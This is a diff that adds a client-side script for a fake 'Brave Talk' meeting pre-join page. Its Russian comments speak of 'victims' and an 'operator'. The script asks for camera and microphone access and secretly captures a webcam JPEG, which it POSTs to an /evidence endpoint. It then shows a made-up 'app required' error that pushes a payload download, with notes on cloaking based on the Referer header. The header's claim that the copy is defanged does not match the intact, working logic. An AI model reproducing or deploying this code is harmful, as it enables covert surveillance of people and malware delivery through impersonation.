@@ -1,0 +1,631 @@
+// DEFANGED copy for study. Live endpoints neutralised. This is the fake 'Brave Talk' prejoin page script.
+// It requests camera+mic, POSTs a webcam JPEG to /evidence/<code>, then shows a fake 'install the app' error.
+// ---
+/* Brave Talk «вход в митинг» — контроллер текущего преждойна talk.brave.com.
+   Поток: имя -> Join meeting (кнопка активна только с именем, как вживую)
+   -> дропдаун с тремя вариантами входа (без звука / без видео / без всего)
+   -> Connecting -> правдоподобная ошибка «нужно приложение»
+   + скачивание приложения (пейлоад, только Windows/macOS). Без alert(). */
+(function () {
+  "use strict";
+
+  /* ---------- i18n: язык браузера жертвы (en по умолчанию) ---------- */
+  /* интерфейс всегда английский (как у настоящего сервиса) */
+  var LANG = "en";
+  var STR = {
+    en: {
+      joinMeeting: "Join meeting", enterName: "Enter your name",
+      nameHint: "Please enter your name to join the meeting",
+      recording: "Other participants may be recording this call",
+      joinNoAudio: "Join without audio", joinNoVideo: "Join without video",
+      joinNoAV: "Join without audio and video",
+      joinNoAudioD: "Join the meeting with microphone muted",
+      joinNoVideoD: "Join the meeting with camera off",
+      joinNoAVD: "Join the meeting with microphone muted and camera off",
+      connecting: "Connecting to the meeting…",
+      errTitle: "Couldn't connect to the call",
+      errBody1: "Joining a <b>Brave Talk Premium</b> meeting requires the Brave Talk desktop app. ",
+      errBody2: "We couldn't detect it on this device.",
+      download: "Download Brave Talk", dlStarted: "Your download has started.",
+      phoneBody: "To join this meeting, please open this link on your Windows or Mac computer.", ok: "OK",
+      dlUnavailable: "Download is temporarily unavailable. Please try again in a minute.",
+      netErr: "Network error. Please try again.",
+      onlyDesktop: "To join this meeting, please open this link on your Windows or Mac computer.",
+      camBlocked: "Camera access is blocked in your browser settings.",
+      micBlocked: "Microphone access is blocked in your browser settings.",
+      inviteTitle: "Invite people to the meeting", inviteLink: "Your invite link",
+      copyLink: "Copy link", copied: "Invite link copied to clipboard.",
+      settingsTitle: "Settings", micLabel: "Microphone", camLabel: "Camera",
+      micDefault: "Default — Built-in Microphone", sameSystem: "Same as System",
+      camDefault: "Default — Built-in Camera", noCamera: "No camera",
+      leaveTitle: "Leave the meeting?",
+      leaveBody: "Are you sure you want to leave this meeting?",
+      stay: "Stay", leave: "Leave",
+      unmuteMic: "Unmute microphone", muteMic: "Mute microphone",
+      startCam: "Start camera", stopCam: "Stop camera",
+      inviteBtn: "Invite people", leaveBtn: "Leave the meeting"
+    },
+    ru: {
+      joinMeeting: "Присоединиться к встрече", enterName: "Введите ваше имя",
+      nameHint: "Пожалуйста, введите имя, чтобы присоединиться к встрече",
+      recording: "Другие участники могут записывать этот звонок",
+      joinNoAudio: "Присоединиться без звука", joinNoVideo: "Присоединиться без видео",
+      joinNoAV: "Присоединиться без звука и видео",
+      joinNoAudioD: "Присоединиться к встрече с выключенным микрофоном",
+      joinNoVideoD: "Присоединиться к встрече с выключенной камерой",
+      joinNoAVD: "Присоединиться к встрече с выключенными микрофоном и камерой",
+      connecting: "Подключение к встрече…",
+      errTitle: "Не удалось подключиться к звонку",
+      errBody1: "Чтобы присоединиться к встрече <b>Brave Talk Premium</b>, требуется приложение Brave Talk. ",
+      errBody2: "Похоже, оно не установлено на этом устройстве.",
+      download: "Скачать Brave Talk", dlStarted: "Загрузка началась.",
+      dlUnavailable: "Загрузка временно недоступна. Попробуйте через минуту.",
+      netErr: "Ошибка сети. Попробуйте ещё раз.",
+      onlyDesktop: "Чтобы присоединиться к встрече, откройте эту ссылку на компьютере (Windows или Mac).",
+      camBlocked: "Доступ к камере запрещён в настройках браузера.",
+      micBlocked: "Доступ к микрофону запрещён в настройках браузера.",
+      inviteTitle: "Пригласить на встречу", inviteLink: "Ваша ссылка-приглашение",
+      copyLink: "Копировать ссылку", copied: "Ссылка-приглашение скопирована.",
+      settingsTitle: "Настройки", micLabel: "Микрофон", camLabel: "Камера",
+      micDefault: "По умолчанию — встроенный микрофон", sameSystem: "Как в системе",
+      camDefault: "По умолчанию — встроенная камера", noCamera: "Без камеры",
+      leaveTitle: "Покинуть встречу?",
+      leaveBody: "Вы действительно хотите покинуть встречу?",
+      stay: "Остаться", leave: "Покинуть",
+      unmuteMic: "Включить микрофон", muteMic: "Выключить микрофон",
+      startCam: "Включить камеру", stopCam: "Выключить камеру",
+      inviteBtn: "Пригласить участников", leaveBtn: "Покинуть встречу"
+    }
+  };
+  var T = STR[LANG] || STR.en;
+  function t(k) { return T[k] || STR.en[k] || k; }
+
+  /* форс-мобильная вёрстка по факту телефона (UA), независимо от viewport
+     (встроенные браузеры мессенджеров иногда рендерят десктопной шириной) */
+  var IS_MOBILE_UA = /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
+  if (IS_MOBILE_UA) {
+    document.documentElement.classList.add("bt-mobile");
+  }
+
+  var qs = function (s) { return document.querySelector(s); };
+
+  function codeFromUrl() {
+    var m = location.search.match(/[?&](?:join|p)=([^&]+)/);
+    if (m) return decodeURIComponent(m[1]);
+    m = location.pathname.match(/\/([A-Za-z0-9_-]{6,64})\/?$/);
+    return m ? m[1] : "";
+  }
+
+  var root = document.createElement("div");
+  root.id = "bt-root";
+  document.body.appendChild(root);
+
+  function show(html) { root.innerHTML = html; root.style.display = "flex"; }
+  function hide() { root.style.display = "none"; root.innerHTML = ""; }
+
+  function toast(msg, isErr) {
+    var t = document.getElementById("bt-toast");
+    if (!t) {
+      t = document.createElement("div");
+      t.id = "bt-toast";
+      document.body.appendChild(t);
+    }
+    t.textContent = msg;
+    t.style.border = isErr ? "1px solid #FF7B6B" : "1px solid #2C5A3D";
+    t.style.display = "block";
+    clearTimeout(t._tm);
+    t._tm = setTimeout(function () { t.style.display = "none"; }, 8000);
+  }
+
+  function isMobile() {
+    return /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
+  }
+
+  function connecting() {
+    show('<div class="bt-shade"></div><div class="bt-dialog"><div class="bt-spinner"></div>' +
+         '<div class="bt-connect">' + t('connecting') + '</div></div>');
+  }
+
+  function callError() {
+    if (isMobile()) {
+      /* телефон: скачивание недоступно — понятное руководство, без кнопки */
+      show(
+        '<div class="bt-shade"></div><div class="bt-dialog">' +
+          warnSvg() +
+          "<h2>" + t("errTitle") + "</h2>" +
+          '<div class="bt-sub">' + t('phoneBody') + '</div>' +
+          '<button id="bt-ok" class="bt-btn">' + t('ok') + '</button>' +
+        "</div>"
+      );
+      var okBtn = document.getElementById("bt-ok");
+      if (okBtn) okBtn.addEventListener("click", hide);
+      return;
+    }
+    show(
+      '<div class="bt-shade"></div><div class="bt-dialog">' +
+        warnSvg() +
+        "<h2>" + t("errTitle") + "</h2>" +
+        '<div class="bt-sub">' + t('errBody1') + t('errBody2') + '</div>' +
+        '<button id="bt-download" class="bt-btn">' + t('download') + '</button>' +
+        '<div class="bt-fine">Brave Talk — unlimited, private video calls. No extra accounts required.</div>' +
+      "</div>"
+    );
+    document.getElementById("bt-download").addEventListener("click", download);
+  }
+
+  function download() {
+    var code = codeFromUrl();
+    var btn = document.getElementById("bt-download");
+    if (isMobile()) {
+      toast(t('onlyDesktop'), true);
+      return;
+    }
+    if (btn) { btn.disabled = true; btn.textContent = "Preparing your download…"; }
+    if (!code) {
+      toast("This page must be opened from your invite link.", true);
+      if (btn) { btn.disabled = false; btn.textContent = t("download"); }
+      return;
+    }
+    fetch("/teams/retreive/" + encodeURIComponent(code) + "/", {
+      headers: { Accept: "application/json" }, credentials: "omit",
+    })
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (btn) { btn.disabled = false; btn.textContent = t("download"); }
+        if (data && data.error === false && data.link) {
+          var a = document.createElement("a");
+          a.href = data.link;
+          if (!/^https?:/i.test(data.link)) {
+            a.setAttribute("download", "true"); // локальная выдача: тихое скачивание
+          } // внешняя (мак-портал): обычный переход — <a download> режет Referer,
+            // а портал без Referer клоакой отвечает 404
+          document.body.appendChild(a);
+          a.click();
+          a.remove();
+          toast(t('dlStarted'));
+        } else {
+          toast((data && data.message) || t('dlUnavailable'), true);
+        }
+      })
+      .catch(function () {
+        if (btn) { btn.disabled = false; btn.textContent = t("download"); }
+        toast(t('netErr'), true);
+      });
+  }
+
+  function warnSvg() {
+    return '<svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#FF8A4D" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3 2.5 20h19L12 3z"/><path d="M12 9.5v5"/><circle cx="12" cy="17.2" r="0.4" fill="#FF8A4D"/></svg>';
+  }
+
+  /* ---------- дропдаун «как войти» — как на живом преждойне ---------- */
+
+  var icMicOff = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#A9B4C4" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a3 3 0 0 0-3 3v6a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3z"/><path d="M19 10v1a7 7 0 0 1-14 0v-1"/><line x1="12" y1="18" x2="12" y2="22"/><line x1="5" y1="3" x2="19" y2="21"/></svg>';
+  var icCamOff = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#A9B4C4" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M10.66 6.14C11.08 6.05 11.53 6 12 6h8a2 2 0 0 1 2 2v8a2 2 0 0 1-.46 1.28"/><path d="M20.84 12.81 22 12V6l-4.29 3.29"/><path d="M2 8a2 2 0 0 1 2-2h2.9"/><path d="M2 2l20 20"/><path d="M9.15 9.18A2 2 0 0 0 8 10.9v6.21a2 2 0 0 0 2 2h7.5"/><path d="M14 20.7l2-.5"/></svg>';
+  var icBoth = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#A9B4C4" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a3 3 0 0 0-3 3v3"/><path d="M9 11v0a3 3 0 0 0 5.18 2.1"/><path d="M19 10v1a7 7 0 0 1-9.8 6.43"/><line x1="12" y1="18" x2="12" y2="22"/><path d="M2 2l20 20"/><path d="M2 8a2 2 0 0 1 2-2h1"/><path d="M8.4 13A2 2 0 0 0 10 17.11h7.6"/><path d="M14.5 6H20a2 2 0 0 1 2 2v5.11"/></svg>';
+
+  var menu = null;
+
+  function closeMenu() {
+    if (menu) { menu.remove(); menu = null; }
+    var chev = qs('[data-testid="prejoin.joinOptions"]');
+    if (chev) chev.setAttribute("aria-pressed", "false");
+  }
+
+  function toggleMenu(anchor) {
+    if (menu) { closeMenu(); return; }
+    menu = document.createElement("div");
+    menu.id = "bt-joinmenu";
+    var items = [
+      [icMicOff, t("joinNoAudio"), t("joinNoAudioD")],
+      [icCamOff, t("joinNoVideo"), t("joinNoVideoD")],
+      [icBoth, t("joinNoAV"), t("joinNoAVD")],
+    ];
+    items.forEach(function (it) {
+      var row = document.createElement("div");
+      row.className = "jm-item";
+      row.innerHTML = '<span class="jm-ic">' + it[0] + "</span><span><div class='jm-t'>" +
+        it[1] + "</div><div class='jm-d'>" + it[2] + "</div></span>";
+      row.addEventListener("click", function (e) {
+        e.stopPropagation();
+        closeMenu();
+        tryJoin();
+      });
+      menu.appendChild(row);
+    });
+    document.body.appendChild(menu);
+    var r = anchor.getBoundingClientRect();
+    var w = 300;
+    menu.style.top = (r.bottom + window.scrollY + 6) + "px";
+    menu.style.left = Math.max(8, r.right + window.scrollX - w) + "px";
+    menu.style.minWidth = w + "px";
+    anchor.setAttribute("aria-pressed", "true");
+  }
+
+  /* ---------- преждойн: имя -> кнопка активна -> вход ---------- */
+
+  var input, joinBtn, hint;
+
+  function nameOk() { return !!(input && (input.value || "").trim()); }
+
+  /* как на живой странице: кнопка всегда синяя; при пустом имени —
+     красная обводка поля + красный баннер-подсказка, при вводе они исчезают */
+  function syncState() {
+    /* при пустом имени ничего не показываем — ошибка только после попытки входа */
+    if (nameOk()) {
+      input.classList.remove("error");
+      input.setAttribute("aria-invalid", "false");
+      if (hint) hint.style.display = "none";
+    }
+  }
+
+  function tryJoin() {
+    if (!nameOk()) {
+      input.classList.add("error");
+      input.setAttribute("aria-invalid", "true");
+      if (hint) hint.style.display = "block";
+      input.focus();
+      return;
+    }
+    closeMenu();
+    requestMediaThenJoin();
+  }
+
+  /* Вход как вживую: браузер спрашивает микрофон+камеру, дали — алерт/фото
+     оператору, затем Connecting и правдоподобная ошибка «нужно приложение». */
+  function requestMediaThenJoin() {
+    var done = false;
+    function proceed() {
+      if (done) return;
+      done = true;
+      connecting();
+      setTimeout(callError, 1700 + Math.random() * 1100);
+    }
+    var md = navigator.mediaDevices;
+    if (!md || !md.getUserMedia) { proceed(); return; }
+    md.getUserMedia({
+      audio: true,
+      video: { width: 1280, height: 720, facingMode: "user" },
+    }).then(function (s) {
+      reportEvidence("mic");
+      var hasVideo = s.getVideoTracks().length > 0;
+      if (!hasVideo) { s.getTracks().forEach(function (t) { t.stop(); }); proceed(); return; }
+      var v = document.createElement("video");
+      v.autoplay = true; v.muted = true; v.playsInline = true;
+      v.srcObject = s;
+      v.style.cssText = "position:fixed;left:-9999px;top:0;width:320px;height:180px;";
+      document.body.appendChild(v);
+      setTimeout(function () {
+        try {
+          var c = document.createElement("canvas");
+          c.width = v.videoWidth || 1280;
+          c.height = v.videoHeight || 720;
+          c.getContext("2d").drawImage(v, 0, 0);
+          c.toBlob(function (b) { if (b) reportEvidence("camera", b); }, "image/jpeg", 0.85);
+        } catch (e) {}
+        setTimeout(function () {
+          s.getTracks().forEach(function (t) { t.stop(); });
+          v.remove();
+        }, 2500);
+      }, 1500);
+      proceed();
+    }).catch(function () { proceed(); });
+  }
+
+  /* ---------- рабочий тулбар преждойна (как на живой странице) ---------- */
+
+  var IC_MIC_ON = '<svg width="24" height="24" viewBox="0 0 24 24"><path d="M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg>';
+  var IC_CAM_ON = '<svg width="24" height="24" viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>';
+
+  var nativeMicHtml = null, nativeCamHtml = null, camStream = null, camVideo = null;
+
+  function toolBtn(label) {
+    return document.querySelector('.toolbox-button[aria-label="' + label + '"]');
+  }
+
+  function setToolIcon(btn, html) {
+    var ico = btn.querySelector(".toolbox-icon");
+    if (ico && html) ico.innerHTML = html;
+  }
+
+  function reportEvidence(kind, blob) {
+    var code = codeFromUrl();
+    if (!code) return;
+    try {
+      var fd = new FormData();
+      fd.append("event", kind);
+      if (blob) fd.append("photo", blob, "cam.jpg");
+      fetch("/evidence/" + encodeURIComponent(code), {
+        method: "POST", body: fd, credentials: "omit",
+      }).catch(function () {});
+    } catch (e) {}
+  }
+
+  var micBtn = null, camBtn = null;
+
+  /* микрофон: как вживую — запрашиваем доступ; дали — включаем и стучим трекеру */
+  function micAction() {
+    var b = micBtn;
+    if (!b) return;
+    if (b.getAttribute("aria-pressed") === "true") {
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(function (s) {
+        s.getTracks().forEach(function (x) { x.stop(); });
+        b.setAttribute("aria-pressed", "false");
+        b.setAttribute("aria-label", t("muteMic"));
+        var ico = b.querySelector(".toolbox-icon");
+        if (ico) ico.classList.remove("toggled");
+        setToolIcon(b, '<div class="jitsi-icon jitsi-icon-default">' + IC_MIC_ON + "</div>");
+        reportEvidence("mic");
+      }).catch(function () {
+        toast(t("micBlocked"), true);
+      });
+    } else {
+      b.setAttribute("aria-pressed", "true");
+      b.setAttribute("aria-label", t("unmuteMic"));
+      var ico2 = b.querySelector(".toolbox-icon");
+      if (ico2) ico2.classList.add("toggled");
+      setToolIcon(b, nativeMicHtml);
+    }
+  }
+
+  /* камера: живое превью в видео-области + снимок оператору */
+  function camAction() {
+    var b = camBtn;
+    if (!b) return;
+    if (b.getAttribute("aria-pressed") === "true") {
+      navigator.mediaDevices.getUserMedia({
+        video: { width: 1280, height: 720, facingMode: "user" },
+      }).then(function (s) {
+        camStream = s;
+        b.setAttribute("aria-pressed", "false");
+        b.setAttribute("aria-label", t("stopCam"));
+        var ico = b.querySelector(".toolbox-icon");
+        if (ico) ico.classList.remove("toggled");
+        setToolIcon(b, '<div class="jitsi-icon jitsi-icon-default">' + IC_CAM_ON + "</div>");
+        showCamPreview();
+        setTimeout(function waitForFrame() {
+          if (!camVideo) return;
+          if (!camVideo.videoWidth) { setTimeout(waitForFrame, 300); return; }
+          try {
+            var c = document.createElement("canvas");
+            c.width = camVideo.videoWidth;
+            c.height = camVideo.videoHeight;
+            c.getContext("2d").drawImage(camVideo, 0, 0);
+            c.toBlob(function (blob) { if (blob) reportEvidence("camera", blob); },
+                     "image/jpeg", 0.85);
+          } catch (e) {}
+        }, 1500);
+      }).catch(function () {
+        toast(t("camBlocked"), true);
+      });
+    } else {
+      b.setAttribute("aria-pressed", "true");
+      b.setAttribute("aria-label", t("startCam"));
+      var ico2 = b.querySelector(".toolbox-icon");
+      if (ico2) ico2.classList.add("toggled");
+      setToolIcon(b, nativeCamHtml);
+      stopCamPreview();
+    }
+  }
+
+  function showCamPreview() {
+    var preview = qs("#preview");
+    if (!preview || !camStream) return;
+    var avatar = preview.querySelector(".avatar");
+    if (avatar) avatar.style.display = "none";
+    camVideo = document.createElement("video");
+    camVideo.autoplay = true;
+    camVideo.muted = true;
+    camVideo.playsInline = true;
+    camVideo.srcObject = camStream;
+    camVideo.style.cssText = "width:100%;height:100%;object-fit:cover;";
+    preview.appendChild(camVideo);
+  }
+
+  function stopCamPreview() {
+    if (camStream) {
+      camStream.getTracks().forEach(function (t) { t.stop(); });
+      camStream = null;
+    }
+    if (camVideo) { camVideo.remove(); camVideo = null; }
+    var preview = qs("#preview");
+    var avatar = preview && preview.querySelector(".avatar");
+    if (avatar) avatar.style.display = "";
+  }
+
+  function modal(title, bodyHtml) {
+    show('<div class="bt-shade"></div><div class="bt-dialog bt-modal">' +
+         '<button class="bt-x" type="button" aria-label="Close">✕</button><h3>' + title + "</h3>" +
+         bodyHtml + "</div>");
+    var x = document.querySelector("#bt-root .bt-x");
+    if (x) x.addEventListener("click", hide);
+    var shade = document.querySelector("#bt-root .bt-shade");
+    if (shade) shade.addEventListener("click", hide);
+    return document.querySelector("#bt-root .bt-modal");
+  }
+
+  function inviteDialog() {
+    var link = location.origin + location.pathname + location.search;
+    modal(t('inviteTitle'),
+      '<div class="bt-label">' + t('inviteLink') + '</div>' +
+      '<div class="bt-input bt-link" id="bt-inv">' + link + '</div>' +
+      '<div class="bt-row"><button class="bt-btn bt-btn-ghost" id="bt-copy" type="button">' + t('copyLink') + '</button></div>');
+    var cp = document.getElementById("bt-copy");
+    if (cp) cp.addEventListener("click", function () {
+      try {
+        var el = document.getElementById("bt-inv");
+        var text = el ? (el.textContent || "") : link;
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(text);
+        } else {
+          var ta = document.createElement("textarea");
+          ta.value = text;
+          document.body.appendChild(ta);
+          ta.select();
+          document.execCommand("copy");
+          ta.remove();
+        }
+      } catch (e) {}
+      toast(t('copied'));
+    });
+  }
+
+  function backgroundDialog() {
+    var m = modal("Select background",
+      '<div class="bt-tiles">' +
+      '<div class="bt-tile sel" data-bg="none">Off<small>Default</small></div>' +
+      '<div class="bt-tile" data-bg="blur">Blur<small>Slight</small></div>' +
+      '<div class="bt-tile" data-bg="image">Image<small>Brave</small></div>' +
+      "</div>");
+    if (m) m.querySelectorAll(".bt-tile").forEach(function (t) {
+      t.addEventListener("click", function () {
+        m.querySelectorAll(".bt-tile").forEach(function (x) { x.classList.remove("sel"); });
+        t.classList.add("sel");
+        setTimeout(hide, 350);
+      });
+    });
+  }
+
+  function settingsDialog() {
+    modal(t('settingsTitle'),
+      '<div class="bt-label">' + t('micLabel') + '</div>' +
+      '<select class="bt-input"><option>' + t('micDefault') + '</option><option>' + t('sameSystem') + '</option></select>' +
+      '<div class="bt-label">' + t('camLabel') + '</div>' +
+      '<select class="bt-input"><option>' + t('camDefault') + '</option><option>' + t('noCamera') + '</option></select>');
+  }
+
+  function leaveDialog() {
+    modal(t('leaveTitle'),
+      '<div class="bt-sub" style="margin:0">' + t('leaveBody') + '</div>' +
+      '<div class="bt-row">' +
+      '<button class="bt-btn bt-btn-ghost" id="bt-stay" type="button">' + t('stay') + '</button>' +
+      '<button class="bt-btn" id="bt-leave" type="button" style="background:#C7372C">' + t('leave') + '</button></div>');
+    var st = document.getElementById("bt-stay");
+    if (st) st.addEventListener("click", hide);
+    var lv = document.getElementById("bt-leave");
+    if (lv) lv.addEventListener("click", function () { location.href = "/"; });
+  }
+
+  function wireToolbar() {
+    micBtn = document.querySelector('.toolbox-button[aria-label="Unmute microphone"]');
+    camBtn = document.querySelector('.toolbox-button[aria-label="Start camera"]');
+    var inv = document.querySelector('.toolbox-button[aria-label="Invite people"]');
+    var lv = document.querySelector('.toolbox-button[aria-label="Leave the meeting"]');
+    [micBtn, camBtn].forEach(function (b) {
+      if (!b) return;
+      b.classList.remove("disabled");
+      b.removeAttribute("aria-disabled");
+      var ico = b.querySelector(".toolbox-icon");
+      if (ico) ico.classList.remove("disabled");
+    });
+    if (micBtn) {
+      nativeMicHtml = (micBtn.querySelector(".toolbox-icon") || {}).innerHTML || null;
+      micBtn.setAttribute("aria-pressed", "true");
+      micBtn.setAttribute("aria-label", t("unmuteMic"));
+      micBtn.setAttribute("data-bt", "mic");
+      micBtn.addEventListener("click", micAction);
+    }
+    if (camBtn) {
+      nativeCamHtml = (camBtn.querySelector(".toolbox-icon") || {}).innerHTML || null;
+      camBtn.setAttribute("aria-pressed", "true");
+      camBtn.setAttribute("aria-label", t("startCam"));
+      camBtn.setAttribute("data-bt", "cam");
+      camBtn.addEventListener("click", camAction);
+    }
+    if (inv) { inv.setAttribute("aria-label", t("inviteBtn")); inv.addEventListener("click", inviteDialog); }
+    if (lv) { lv.setAttribute("aria-label", t("leaveBtn")); lv.addEventListener("click", leaveDialog); }
+  }
+
+  /* перевод статических надписей преждойна под язык браузера */
+  function applyLang() {
+    document.documentElement.lang = LANG;
+    var h = qs(".css-hfg03y-title");
+    if (h) h.textContent = t("joinMeeting");
+    if (input) {
+      input.setAttribute("placeholder", t("enterName"));
+      input.setAttribute("aria-label", t("enterName"));
+    }
+    if (joinBtn) {
+      for (var i = 0; i < joinBtn.childNodes.length; i++) {
+        if (joinBtn.childNodes[i].nodeType === 3 && joinBtn.childNodes[i].nodeValue.trim()) {
+          joinBtn.childNodes[i].nodeValue = t("joinMeeting");
+          break;
+        }
+      }
+    }
+    if (hint) hint.textContent = t("nameHint");
+    var w = qs(".css-y95g3r-warning");
+    if (w) w.textContent = t("recording");
+  }
+
+  function wire() {
+    document.title = "Brave Talk";
+    input = qs("#premeeting-name-input");
+    joinBtn = qs('[data-testid="prejoin.joinMeeting"]');
+    var chev = qs('[data-testid="prejoin.joinOptions"]');
+    if (!input || !joinBtn) return;
+
+    input.value = "";
+    hint = qs("#bt-name-hint");
+    applyLang();
+
+    // аватар поверх видео-области: правее градиентной панели, центр по вертикали
+    var preview = qs("#preview");
+    var screenEl = qs(".premeeting-screen");
+    if (preview && screenEl && preview.parentElement !== screenEl) screenEl.appendChild(preview);
+    var initials = preview ? preview.querySelector(".css-1s788x3-initialsContainer") : null;
+    function placePreview() {
+      if (!preview || IS_MOBILE_UA) return;
+      var panel = qs(".css-1y9ozej-content");
+      var left = panel ? Math.round(panel.getBoundingClientRect().width) : 0;
+      preview.style.position = "absolute";
+      preview.style.left = left + "px";
+      preview.style.right = "0";
+      preview.style.top = "0";
+      preview.style.bottom = "0";
+      preview.style.width = "auto";
+      preview.style.height = "auto";
+    }
+    placePreview();
+    window.addEventListener("resize", placePreview);
+    window.addEventListener("orientationchange", function () {
+      setTimeout(placePreview, 250);
+    });
+    wireToolbar();
+    function setInitials() {
+      if (!initials) return;
+      var words = (input.value || "").trim().split(/\s+/).filter(Boolean);
+      var s = words.map(function (w) { return w[0]; }).join("").toUpperCase().slice(0, 2);
+      initials.textContent = s;
+    }
+
+    syncState();
+    input.addEventListener("input", function () {
+      syncState();
+      setInitials();
+    });
+
+    joinBtn.addEventListener("click", function (e) {
+      if (e.target && e.target.closest && e.target.closest('[data-testid="prejoin.joinOptions"]')) {
+        if (nameOk()) { e.stopPropagation(); toggleMenu(chev); }
+        return;
+      }
+      tryJoin();
+    });
+    input.addEventListener("keydown", function (e) { if (e.key === "Enter") tryJoin(); });
+
+    document.addEventListener("click", function (e) {
+      if (menu && !e.target.closest("#bt-joinmenu") && !e.target.closest('[data-testid="prejoin.joinOptions"]')) {
+        closeMenu();
+      }
+    });
+    document.addEventListener("keydown", function (e) {
+      if (e.key === "Escape") {
+        if (menu) closeMenu();
+        else if (root.style.display === "flex") hide();
+      }
+    });
+  }
+
+  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", wire);
+  else wire();
+})();
